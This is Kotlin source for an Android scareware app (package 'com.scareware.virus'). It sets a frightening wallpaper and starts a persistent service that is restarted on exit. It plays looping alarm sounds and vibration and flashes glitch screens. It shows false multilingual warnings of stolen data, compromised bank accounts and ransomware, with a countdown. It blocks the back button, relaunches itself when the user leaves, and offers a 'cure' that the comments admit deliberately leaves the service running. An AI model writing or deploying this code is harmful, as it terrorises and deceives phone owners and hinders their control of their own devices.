package com.scareware.virus

import android.app.WallpaperManager
import android.content.Intent
import android.graphics.BitmapFactory
import android.graphics.Color
import android.media.AudioAttributes
import android.media.MediaPlayer
import android.media.RingtoneManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.view.View
import android.view.WindowManager
import android.view.animation.AlphaAnimation
import android.view.animation.Animation
import android.widget.Button
import android.widget.ImageView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import kotlin.random.Random

class MainActivity : AppCompatActivity() {

    private var mediaPlayer: MediaPlayer? = null
    private val handler = Handler(Looper.getMainLooper())
    private var glitchRunnable: Runnable? = null
    private var isLocked = true

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.addFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            window.attributes.layoutInDisplayCutoutMode =
                WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
        }

        window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        or View.SYSTEM_UI_FLAG_FULLSCREEN
                        or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                )

        setContentView(R.layout.activity_main)

        // Try change wallpaper to scary image
        try {
            val wm = WallpaperManager.getInstance(this)
            val bmp = BitmapFactory.decodeResource(resources, R.drawable.scary_face)
            if (bmp != null) {
                wm.setBitmap(bmp)
            }
        } catch (_: Exception) {}

        // Start persistent scare service
        val svc = Intent(this, ScareService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc)
        } else {
            startService(svc)
        }

        startScare()
    }

    private fun startScare() {
        // Local sound too (service also plays)
        try {
            mediaPlayer = MediaPlayer.create(this, R.raw.scare_sound)
            mediaPlayer?.isLooping = true
            mediaPlayer?.setVolume(1f, 1f)
            mediaPlayer?.start()
        } catch (e: Exception) {
            try {
                val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                mediaPlayer = MediaPlayer().apply {
                    setDataSource(this@MainActivity, uri)
                    setAudioAttributes(
                        AudioAttributes.Builder()
                            .setUsage(AudioAttributes.USAGE_ALARM)
                            .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                            .build()
                    )
                    isLooping = true
                    prepare()
                    start()
                }
            } catch (_: Exception) {}
        }

        // Vibrate
        try {
            val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                v.vibrate(VibrationEffect.createWaveform(longArrayOf(0, 400, 200, 400, 200, 800), 0))
            } else {
                @Suppress("DEPRECATION")
                v.vibrate(longArrayOf(0, 400, 200, 400, 200, 800), 0)
            }
        } catch (_: Exception) {}

        startGlitch()

        val messages = listOf(
            "⚠ DỮ LIỆU CỦA BẠN ĐÃ BỊ ĐÁNH CẮP ⚠",
            "⚠ YOUR DATA HAS BEEN STOLEN ⚠",
            "⚠ 您的数据已被窃取 ⚠",
            "⚠ تم سرقة بياناتك ⚠",
            "BANK / CRYPTO COMPROMISED",
            "PHOTOS & MESSAGES UPLOADED",
            "DEVICE LOCKED BY RANSOMWARE",
            "⚠ SYSTEM DESTROYED ⚠"
        )

        val scareText = findViewById<TextView>(R.id.scareText)
        var idx = 0
        handler.post(object : Runnable {
            override fun run() {
                if (!isLocked) return
                scareText.text = messages[idx % messages.size]
                idx++
                handler.postDelayed(this, 1400)
            }
        })

        val timerView = findViewById<TextView>(R.id.timerText)
        var seconds = 3599
        handler.post(object : Runnable {
            override fun run() {
                if (!isLocked) return
                timerView.text = String.format("TIME LEFT: %02d:%02d", seconds / 60, seconds % 60)
                if (seconds > 0) seconds--
                handler.postDelayed(this, 1000)
            }
        })

        findViewById<Button>(R.id.cureButton).setOnClickListener {
            showCure()
        }
    }

    private fun startGlitch() {
        val root = findViewById<View>(R.id.rootLayout)
        val img = findViewById<ImageView>(R.id.scaryImage)
        glitchRunnable = object : Runnable {
            override fun run() {
                if (!isLocked) return
                val colors = intArrayOf(
                    Color.BLACK, Color.RED, Color.WHITE,
                    Color.YELLOW, Color.rgb(180, 0, 0), Color.rgb(40, 0, 0)
                )
                root.setBackgroundColor(colors[Random.nextInt(colors.size)])

                val anim = AlphaAnimation(0.2f, 1f)
                anim.duration = 60
                anim.repeatMode = Animation.REVERSE
                anim.repeatCount = 3
                img.startAnimation(anim)

                handler.postDelayed(this, Random.nextLong(80, 320))
            }
        }
        handler.post(glitchRunnable!!)
    }

    private fun showCure() {
        val cure = findViewById<TextView>(R.id.cureText)
        cure.visibility = View.VISIBLE
        cure.text = """
            【解除病毒 / إزالة الفيروس】
            
            输入密码 / أدخل كلمة المرور:
            解除码: 病毒已清除
            رمز الإزالة: تم إزالة الفيروس
            
            正在清理中... جاري التنظيف...
            (Chỉ hết thật khi GỠ APP)
        """.trimIndent()

        // Fake cure - actually does almost nothing, service keeps running
        handler.postDelayed({
            // Just hide UI a bit, service continues
            isLocked = false
            mediaPlayer?.stop()
            mediaPlayer?.release()
            mediaPlayer = null
            glitchRunnable?.let { handler.removeCallbacks(it) }
            // Do NOT stop the service
            finish()
        }, 3500)
    }

    override fun onBackPressed() {
        // Block back, keep scaring
        if (!isLocked) super.onBackPressed()
    }

    override fun onUserLeaveHint() {
        // Restart activity + keep service
        if (isLocked) {
            val i = intent
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            startActivity(i)
        }
    }

    override fun onDestroy() {
        // Ensure service keeps running
        val svc = Intent(this, ScareService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc)
        } else {
            startService(svc)
        }
        mediaPlayer?.release()
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }
}
